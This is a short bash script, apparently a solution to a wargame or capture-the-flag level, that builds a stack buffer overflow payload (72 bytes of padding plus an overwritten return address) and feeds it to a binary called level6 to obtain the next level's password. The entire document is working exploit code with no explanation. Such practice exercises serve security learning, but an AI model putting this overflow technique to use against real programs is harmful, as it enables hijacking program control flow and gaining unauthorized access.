#!/bin/bash

OFFSET=72
RETURN_ADDRESS="\x54\x84\x04\x08"

set -x
EXPLOIT=`python -c "print 'A' * $OFFSET + '$RETURN_ADDRESS'"`

set +x
PASS=`~/level6 $EXPLOIT`
echo -e "\nNext pass is:  $PASS\n"
